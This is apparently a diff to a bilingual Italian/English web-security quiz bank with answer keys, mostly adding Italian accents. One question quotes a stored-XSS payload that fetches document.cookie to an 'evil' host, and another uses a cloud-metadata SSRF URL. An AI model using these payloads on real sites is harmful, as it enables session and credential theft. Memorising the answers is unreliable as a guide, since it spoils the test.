@@ -10,7 +10,7 @@
     ],
     "type": "single",
     "difficulty": 3,
-    "question": "In un XSS di tipo DOM-based il payload malevolo non transita mai dal server ma viene eseguito perche il codice JavaScript lato client scrive dati non fidati in un sink pericoloso. Quale coppia sorgente-sink e il classico esempio di DOM XSS?",
+    "question": "In un XSS di tipo DOM-based il payload malevolo non transita mai dal server ma viene eseguito perché il codice JavaScript lato client scrive dati non fidati in un sink pericoloso. Quale coppia sorgente-sink e il classico esempio di DOM XSS?",
     "question_en": "In a DOM-based XSS the malicious payload never passes through the server but is executed because the client-side JavaScript writes untrusted data into a dangerous sink. Which source-sink pair is the classic example of DOM XSS?",
     "options": [
       "location.hash letto e passato a element.innerHTML",
@@ -27,12 +27,12 @@
     "correct": [
       0
     ],
-    "explanation": "Nel DOM XSS il flusso resta interamente nel browser: una sorgente controllata dall'utente (come location.hash, document.URL o location.search) finisce in un sink che interpreta HTML/JS (innerHTML, document.write, eval). Poiche il server non vede il payload, molti WAF non lo intercettano; la difesa e usare API sicure come textContent e sanitizzare/encodare prima di scrivere nel DOM.",
+    "explanation": "Nel DOM XSS il flusso resta interamente nel browser: una sorgente controllata dall'utente (come location.hash, document.URL o location.search) finisce in un sink che interpreta HTML/JS (innerHTML, document.write, eval). Poiché il server non vede il payload, molti WAF non lo intercettano; la difesa e usare API sicure come textContent e sanitizzare/encodare prima di scrivere nel DOM.",
     "explanation_en": "In DOM XSS the flow stays entirely within the browser: a user-controlled source (such as location.hash, document.URL or location.search) ends up in a sink that interprets HTML/JS (innerHTML, document.write, eval). Because the server never sees the payload, many WAFs do not intercept it; the defense is to use safe APIs such as textContent and to sanitize/encode before writing to the DOM.",
     "why_wrong": {
-      "1": "Un parametro POST che passa dal server e viene salvato descrive uno scenario stored/reflected server-side, non DOM-based; inoltre e gia validato.",
+      "1": "Un parametro POST che passa dal server e viene salvato descrive uno scenario stored/reflected server-side, non DOM-based; inoltre e già validato.",
       "2": "Impostare Content-Type application/json e una difesa/comportamento del server, non una sorgente-sink DOM.",
-      "3": "Un valore di sessione firmato e verificato non e una sorgente non fidata scritta in un sink DOM."
+      "3": "Un valore di sessione firmato e verificato non è una sorgente non fidata scritta in un sink DOM."
     },
     "why_wrong_en": {
       "1": "A POST parameter that passes through the server and is saved describes a server-side stored/reflected scenario, not DOM-based; moreover it is already validated.",
@@ -52,13 +52,13 @@
     ],
     "type": "single",
     "difficulty": 2,
-    "question": "Un'applicazione mostra i commenti degli utenti cosi come inseriti. Un attaccante pubblica un commento contenente <script>fetch('//evil/'+document.cookie)</script> e da quel momento ogni visitatore della pagina esegue lo script. Di quale tipo di XSS si tratta e qual e la difesa primaria?",
+    "question": "Un'applicazione mostra i commenti degli utenti così come inseriti. Un attaccante pubblica un commento contenente <script>fetch('//evil/'+document.cookie)</script> e da quel momento ogni visitatore della pagina esegue lo script. Di quale tipo di XSS si tratta e qual è la difesa primaria?",
     "question_en": "An application displays user comments exactly as entered. An attacker posts a comment containing <script>fetch('//evil/'+document.cookie)</script> and from that point every visitor of the page executes the script. Which type of XSS is this and what is the primary defense?",
     "options": [
       "XSS stored; applicare output encoding contestuale in fase di rendering",
       "XSS reflected; abilitare solo il flag Secure sui cookie",
       "XSS DOM-based; disabilitare JavaScript nel browser della vittima",
-      "non e XSS ma CSRF; usare un token anti-CSRF"
+      "non è XSS ma CSRF; usare un token anti-CSRF"
     ],
     "options_en": [
       "Stored XSS; apply contextual output encoding at rendering time",
@@ -69,11 +69,11 @@
     "correct": [
       0
     ],
-    "explanation": "Il payload viene persistito sul server (nel database dei commenti) e servito a tutti gli utenti che visualizzano la pagina: e un XSS stored (persistente), il piu pericoloso perche non richiede di ingannare la singola vittima con un link. La difesa primaria e l'output encoding contestuale al momento del rendering (HTML entity encoding nel corpo, attribute encoding negli attributi), affiancato da CSP e HttpOnly sui cookie.",
+    "explanation": "Il payload viene persistito sul server (nel database dei commenti) e servito a tutti gli utenti che visualizzano la pagina: e un XSS stored (persistente), il più pericoloso perché non richiede di ingannare la singola vittima con un link. La difesa primaria e l'output encoding contestuale al momento del rendering (HTML entity encoding nel corpo, attribute encoding negli attributi), affiancato da CSP e HttpOnly sui cookie.",
     "explanation_en": "The payload is persisted on the server (in the comments database) and served to every user who views the page: it is a stored (persistent) XSS, the most dangerous because it does not require tricking the individual victim with a link. The primary defense is contextual output encoding at rendering time (HTML entity encoding in the body, attribute encoding in attributes), combined with CSP and HttpOnly on cookies.",
     "why_wrong": {
       "1": "Il payload e persistito e colpisce tutti i visitatori: e stored, non reflected; il flag Secure protegge solo il trasporto del cookie e non impedisce l'iniezione.",
-      "2": "Il payload passa dal server ed e memorizzato, quindi non e DOM-based; disabilitare JavaScript non e una difesa applicativa realistica.",
+      "2": "Il payload passa dal server ed e memorizzato, quindi non è DOM-based; disabilitare JavaScript non è una difesa applicativa realistica.",
       "3": "L'esecuzione di script arbitrario nel contesto della pagina e per definizione XSS, non CSRF; un token anti-CSRF non blocca l'iniezione di script."
     },
     "why_wrong_en": {
@@ -94,7 +94,7 @@
     ],
     "type": "single",
     "difficulty": 2,
-    "question": "Quale affermazione descrive correttamente perche le query parametrizzate (prepared statement) neutralizzano la SQL injection?",
+    "question": "Quale affermazione descrive correttamente perché le query parametrizzate (prepared statement) neutralizzano la SQL injection?",
     "question_en": "Which statement correctly describes why parameterized queries (prepared statements) neutralize SQL injection?",
     "options": [
       "I dati dell'utente vengono inviati separatamente dal testo SQL, quindi non possono alterare la struttura della query",
@@ -111,12 +111,12 @@
     "correct": [
       0
     ],
-    "explanation": "Con un prepared statement il driver invia prima il template SQL con i segnaposto e poi i valori come parametri distinti: il motore ha gia compilato la struttura della query, quindi i dati dell'utente sono trattati sempre come valori e mai come codice SQL, indipendentemente dal contenuto. Questo e strutturalmente superiore al semplice escaping manuale.",
+    "explanation": "Con un prepared statement il driver invia prima il template SQL con i segnaposto e poi i valori come parametri distinti: il motore ha già compilato la struttura della query, quindi i dati dell'utente sono trattati sempre come valori e mai come codice SQL, indipendentemente dal contenuto. Questo e strutturalmente superiore al semplice escaping manuale.",
     "explanation_en": "With a prepared statement the driver first sends the SQL template with placeholders and then the values as distinct parameters: the engine has already compiled the query structure, so user data is always treated as values and never as SQL code, regardless of its content. This is structurally superior to simple manual escaping.",
     "why_wrong": {
       "1": "L'escaping HTML riguarda l'XSS in output, non la separazione codice/dati verso il database.",
       "2": "Cifrare la connessione (TLS) protegge il trasporto ma non impedisce che un input malevolo modifichi la query.",
-      "3": "Ridurre i privilegi e una difesa in profondita utile, ma non e il meccanismo con cui i prepared statement bloccano l'injection."
+      "3": "Ridurre i privilegi e una difesa in profondità utile, ma non è il meccanismo con cui i prepared statement bloccano l'injection."
     },
     "why_wrong_en": {
       "1": "HTML escaping concerns XSS in output, not the code/data separation toward the database.",
@@ -136,7 +136,7 @@
     ],
     "type": "single",
     "difficulty": 3,
-    "question": "L'attributo SameSite di un cookie di sessione mitiga il CSRF. Quale comportamento e corretto per il valore SameSite=Lax?",
+    "question": "L'attributo SameSite di un cookie di sessione mitiga il CSRF. Quale comportamento è corretto per il valore SameSite=Lax?",
     "question_en": "The SameSite attribute of a session cookie mitigates CSRF. Which behavior is correct for the value SameSite=Lax?",
     "options": [
       "Il cookie viene inviato nelle navigazioni top-level in GET ma non nelle richieste cross-site POST",
@@ -153,11 +153,11 @@
     "correct": [
       0
     ],
-    "explanation": "SameSite=Lax invia il cookie nelle richieste same-site e nelle navigazioni top-level sicure (tipicamente GET, come cliccare un link verso il sito), ma lo omette nelle richieste cross-site di tipo POST o avviate da sottorisorse/JS. Questo blocca gran parte degli attacchi CSRF che usano form POST cross-site, pur mantenendo l'usabilita dei link entranti. SameSite=Strict e piu restrittivo (omette anche i link entranti).",
+    "explanation": "SameSite=Lax invia il cookie nelle richieste same-site e nelle navigazioni top-level sicure (tipicamente GET, come cliccare un link verso il sito), ma lo omette nelle richieste cross-site di tipo POST o avviate da sottorisorse/JS. Questo blocca gran parte degli attacchi CSRF che usano form POST cross-site, pur mantenendo l'usabilità dei link entranti. SameSite=Strict e più restrittivo (omette anche i link entranti).",
     "explanation_en": "SameSite=Lax sends the cookie on same-site requests and on safe top-level navigations (typically GET, such as clicking a link to the site), but omits it on cross-site POST requests or those initiated by subresources/JS. This blocks most CSRF attacks that use cross-site POST forms, while preserving the usability of inbound links. SameSite=Strict is more restrictive (it omits inbound links too).",
     "why_wrong": {
       "1": "Inviare il cookie in tutte le richieste cross-site incluse le POST descrive SameSite=None, non Lax.",
-      "2": "Con Lax il cookie viene comunque inviato quando l'utente naviga direttamente sul sito; non e mai omesso del tutto.",
+      "2": "Con Lax il cookie viene comunque inviato quando l'utente naviga direttamente sul sito; non è mai omesso del tutto.",
       "3": "SameSite non dipende dal fatto che la connessione sia in chiaro; il legame con HTTP/HTTPS e governato dal flag Secure."
     },
     "why_wrong_en": {
@@ -178,7 +178,7 @@
     ],
     "type": "single",
     "difficulty": 3,
-    "question": "Un endpoint riceve un URL fornito dall'utente e ne recupera il contenuto lato server. Un attaccante inserisce http://169.254.169.254/latest/meta-data/ e ottiene credenziali cloud. Di quale vulnerabilita si tratta e qual e la mitigazione piu robusta?",
+    "question": "Un endpoint riceve un URL fornito dall'utente e ne recupera il contenuto lato server. Un attaccante inserisce http://169.254.169.254/latest/meta-data/ e ottiene credenziali cloud. Di quale vulnerabilità si tratta e qual è la mitigazione più robusta?",
     "question_en": "An endpoint receives a user-supplied URL and fetches its content server-side. An attacker enters http://169.254.169.254/latest/meta-data/ and obtains cloud credentials. Which vulnerability is this and what is the most robust mitigation?",
     "options": [
       "SSRF; validare con allow-list di host/schema consentiti e bloccare gli indirizzi interni",
@@ -195,12 +195,12 @@
     "correct": [
       0
     ],
-    "explanation": "Far recuperare al server un URL arbitrario e Server-Side Request Forgery (SSRF): l'attaccante costringe il server a interrogare risorse interne, come l'endpoint di metadata cloud 169.254.169.254 che espone credenziali temporanee. La difesa piu robusta e una allow-list di host e schemi consentiti, bloccando esplicitamente indirizzi privati/link-local, risolvendo il DNS e validando l'IP finale per evitare bypass e rebinding.",
+    "explanation": "Far recuperare al server un URL arbitrario e Server-Side Request Forgery (SSRF): l'attaccante costringe il server a interrogare risorse interne, come l'endpoint di metadata cloud 169.254.169.254 che espone credenziali temporanee. La difesa più robusta e una allow-list di host e schemi consentiti, bloccando esplicitamente indirizzi privati/link-local, risolvendo il DNS e validando l'IP finale per evitare bypass e rebinding.",
     "explanation_en": "Having the server fetch an arbitrary URL is Server-Side Request Forgery (SSRF): the attacker forces the server to query internal resources, such as the cloud metadata endpoint 169.254.169.254 that exposes temporary credentials. The most robust defense is an allow-list of permitted hosts and schemes, explicitly blocking private/link-local addresses, resolving DNS and validating the final IP to avoid bypasses and rebinding.",
     "why_wrong": {
       "1": "L'IDOR riguarda l'accesso non autorizzato a oggetti tramite identificatori, non il fetch di URL arbitrari da parte del server.",
-      "2": "Non c'e esecuzione di script nel browser della vittima: e una richiesta lato server, quindi non e XSS.",
-      "3": "L'open redirect reindirizza il browser dell'utente; qui e il server a effettuare la richiesta verso risorse interne, e il Referer non e una difesa affidabile."
+      "2": "Non c'è esecuzione di script nel browser della vittima: e una richiesta lato server, quindi non è XSS.",
+      "3": "L'open redirect reindirizza il browser dell'utente; qui e il server a effettuare la richiesta verso risorse interne, e il Referer non è una difesa affidabile."
     },
     "why_wrong_en": {
       "1": "IDOR concerns unauthorized access to objects via identifiers, not the server fetching arbitrary URLs.",
@@ -220,7 +220,7 @@
     ],
     "type": "single",
     "difficulty": 2,
-    "question": "Cambiando l'URL /api/fatture/1001 in /api/fatture/1002 un utente autenticato visualizza la fattura di un altro cliente. Quale categoria OWASP descrive il difetto e qual e la correzione corretta?",
+    "question": "Cambiando l'URL /api/fatture/1001 in /api/fatture/1002 un utente autenticato visualizza la fattura di un altro cliente. Quale categoria OWASP descrive il difetto e qual è la correzione corretta?",
     "question_en": "By changing the URL /api/fatture/1001 to /api/fatture/1002, an authenticated user views another customer's invoice. Which OWASP category describes the flaw and what is the correct fix?",
     "options": [
       "Broken Access Control (IDOR); verificare lato server che l'oggetto appartenga all'utente autenticato",
@@ -240,9 +240,9 @@
     "explanation": "E un Insecure Direct Object Reference, sottoinsieme del Broken Access Control: l'applicazione usa l'identificatore fornito dall'utente per recuperare l'oggetto senza verificare che quell'utente ne sia autorizzato. La correzione e un controllo di autorizzazione lato server per ogni richiesta (l'oggetto appartiene al soggetto autenticato?); usare ID non prevedibili aiuta ma non sostituisce il controllo di accesso.",
     "explanation_en": "It is an Insecure Direct Object Reference, a subset of Broken Access Control: the application uses the user-supplied identifier to retrieve the object without verifying that the user is authorized for it. The fix is a server-side authorization check on every request (does the object belong to the authenticated subject?); using unpredictable IDs helps but does not replace the access control check.",
     "why_wrong": {
-      "1": "Rimuovere header di debug riguarda la misconfiguration, non risolve il fatto che manca il controllo di proprieta sull'oggetto.",
+      "1": "Rimuovere header di debug riguarda la misconfiguration, non risolve il fatto che manca il controllo di proprietà sull'oggetto.",
       "2": "Cifrare gli ID e security by obscurity: senza controllo di accesso l'oggetto resta accessibile a chi ottiene l'identificatore.",
-      "3": "Non c'e injection: l'ID viene usato legittimamente nella query, il problema e l'assenza di autorizzazione."
+      "3": "Non c'è injection: l'ID viene usato legittimamente nella query, il problema e l'assenza di autorizzazione."
     },
     "why_wrong_en": {
       "1": "Removing debug headers concerns misconfiguration; it does not solve the missing ownership check on the object.",
@@ -279,7 +279,7 @@
     "correct": [
       0
     ],
-    "explanation": "HttpOnly rende il cookie inaccessibile alle API JavaScript lato client (document.cookie): anche se un attaccante riesce a eseguire XSS nella pagina, non puo esfiltrare direttamente il cookie di sessione tramite script. E una difesa in profondita contro il session hijacking, complementare (non alternativa) alla prevenzione dell'XSS stesso.",
+    "explanation": "HttpOnly rende il cookie inaccessibile alle API JavaScript lato client (document.cookie): anche se un attaccante riesce a eseguire XSS nella pagina, non può esfiltrare direttamente il cookie di sessione tramite script. E una difesa in profondità contro il session hijacking, complementare (non alternativa) alla prevenzione dell'XSS stesso.",
     "explanation_en": "HttpOnly makes the cookie inaccessible to client-side JavaScript APIs (document.cookie): even if an attacker manages to execute XSS in the page, they cannot directly exfiltrate the session cookie via script. It is a defense-in-depth measure against session hijacking, complementary (not an alternative) to preventing the XSS itself.",
     "why_wrong": {
       "1": "Impedire l'invio su HTTP in chiaro e compito del flag Secure, non di HttpOnly.",
@@ -346,7 +346,7 @@
     ],
     "type": "single",
     "difficulty": 3,
-    "question": "Quale configurazione CORS e pericolosa perche permette a qualsiasi sito di leggere risposte autenticate della vittima?",
+    "question": "Quale configurazione CORS e pericolosa perché permette a qualsiasi sito di leggere risposte autenticate della vittima?",
     "question_en": "Which CORS configuration is dangerous because it allows any site to read the victim's authenticated responses?",
     "options": [
       "Riflettere l'header Origin della richiesta in Access-Control-Allow-Origin insieme ad Access-Control-Allow-Credentials: true",
@@ -409,7 +409,7 @@
     "explanation": "HSTS (Strict-Transport-Security) con un max-age lungo e includeSubDomains forza il browser a usare solo HTTPS, mitigando downgrade e SSL stripping. X-Content-Type-Options: nosniff impedisce al browser di indovinare (MIME sniffing) il tipo di contenuto, riducendo attacchi che sfruttano l'interpretazione errata di file. Sono entrambe configurazioni difensive corrette.",
     "explanation_en": "HSTS (Strict-Transport-Security) with a long max-age and includeSubDomains forces the browser to use only HTTPS, mitigating downgrade and SSL stripping. X-Content-Type-Options: nosniff prevents the browser from guessing (MIME sniffing) the content type, reducing attacks that exploit the misinterpretation of files. Both are correct defensive configurations.",
     "why_wrong": {
-      "2": "X-Powered-By: PHP/7.4.3 espone tecnologia e versione, facilitando il fingerprinting: andrebbe rimosso, non e una difesa.",
+      "2": "X-Powered-By: PHP/7.4.3 espone tecnologia e versione, facilitando il fingerprinting: andrebbe rimosso, non è una difesa.",
       "3": "Access-Control-Allow-Origin: * disabilita di fatto le restrizioni cross-origin per le risorse; e permissivo e rischioso, specie su endpoint autenticati."
     },
     "why_wrong_en": {
@@ -429,13 +429,13 @@
     ],
     "type": "multi",
     "difficulty": 3,
-    "question": "Per rendere sicura una funzionalita di upload di file quali due misure sono efficaci e raccomandate? (seleziona le due corrette)",
+    "question": "Per rendere sicura una funzionalità di upload di file quali due misure sono efficaci e raccomandate? (seleziona le due corrette)",
     "question_en": "To secure a file upload feature, which two measures are effective and recommended? (select the two correct ones)",
     "options": [
       "Validare il tipo con una allow-list di estensioni/MIME e verificare i magic bytes del contenuto",
       "Salvare i file fuori dalla web root o servirli senza permesso di esecuzione, con nome generato dal server",
       "Fidarsi dell'estensione dichiarata nel nome file inviato dal client",
-      "Impostare Content-Type: text/html sui file caricati per uniformita"
+      "Impostare Content-Type: text/html sui file caricati per uniformità"
     ],
     "options_en": [
       "Validate the type with an allow-list of extensions/MIME and verify the content's magic bytes",
@@ -447,7 +447,7 @@
       0,
       1
     ],
-    "explanation": "Un upload sicuro combina validazione del contenuto (allow-list di tipi consentiti piu controllo dei magic bytes, non solo dell'estensione) e una gestione dello storage che impedisca l'esecuzione: salvare fuori dalla web root o servire i file da una directory senza esecuzione, rinominandoli con nomi generati dal server per evitare path traversal e sovrascritture. Cosi si previene la web shell e l'esecuzione di codice.",
+    "explanation": "Un upload sicuro combina validazione del contenuto (allow-list di tipi consentiti più controllo dei magic bytes, non solo dell'estensione) e una gestione dello storage che impedisca l'esecuzione: salvare fuori dalla web root o servire i file da una directory senza esecuzione, rinominandoli con nomi generati dal server per evitare path traversal e sovrascritture. Così si previene la web shell e l'esecuzione di codice.",
     "explanation_en": "A secure upload combines content validation (an allow-list of permitted types plus a magic-bytes check, not just the extension) and storage handling that prevents execution: storing outside the web root or serving the files from a directory without execution, renaming them with server-generated names to avoid path traversal and overwrites. This prevents web shells and code execution.",
     "why_wrong": {
       "2": "L'estensione nel nome file e controllata dal client e facilmente falsificabile: fidarsene consente di caricare payload eseguibili.",
@@ -475,7 +475,7 @@
     "options": [
       "Rigenerare l'identificatore di sessione subito dopo un login riuscito",
       "Impostare i cookie di sessione con i flag Secure e HttpOnly",
-      "Inserire l'identificatore di sessione come parametro nell'URL per comodita",
+      "Inserire l'identificatore di sessione come parametro nell'URL per comodità",
       "Memorizzare le password degli utenti con hash MD5 senza salt"
     ],
     "options_en": [
@@ -524,7 +524,7 @@
     "correct": [
       0
     ],
-    "explanation": "Vero. Il token anti-CSRF garantisce che una richiesta che modifica stato provenga effettivamente dall'applicazione legittima, bloccando il CSRF. Tuttavia, se la pagina e vulnerabile a XSS, lo script iniettato gira nel contesto di origine della vittima e puo leggere il token stesso dal DOM e inviarlo, aggirando la protezione: XSS e CSRF sono minacce distinte e l'XSS puo neutralizzare le difese anti-CSRF.",
+    "explanation": "Vero. Il token anti-CSRF garantisce che una richiesta che modifica stato provenga effettivamente dall'applicazione legittima, bloccando il CSRF. Tuttavia, se la pagina e vulnerabile a XSS, lo script iniettato gira nel contesto di origine della vittima e può leggere il token stesso dal DOM e inviarlo, aggirando la protezione: XSS e CSRF sono minacce distinte e l'XSS può neutralizzare le difese anti-CSRF.",
     "explanation_en": "True. The anti-CSRF token ensures that a state-changing request actually originates from the legitimate application, blocking CSRF. However, if the page is vulnerable to XSS, the injected script runs in the victim's origin context and can read the token itself from the DOM and send it, bypassing the protection: XSS and CSRF are distinct threats and XSS can neutralize anti-CSRF defenses.",
     "source": "OWASP CSRF Prevention"
   },
@@ -567,7 +567,7 @@
     ],
     "type": "truefalse",
     "difficulty": 2,
-    "question": "Il flag Secure su un cookie ne cifra il contenuto, quindi un cookie con flag Secure puo essere memorizzato in chiaro senza rischi.",
+    "question": "Il flag Secure su un cookie ne cifra il contenuto, quindi un cookie con flag Secure può essere memorizzato in chiaro senza rischi.",
     "question_en": "The Secure flag on a cookie encrypts its content, so a cookie with the Secure flag can be stored in cleartext without risk.",
     "options": [
       "Vero",
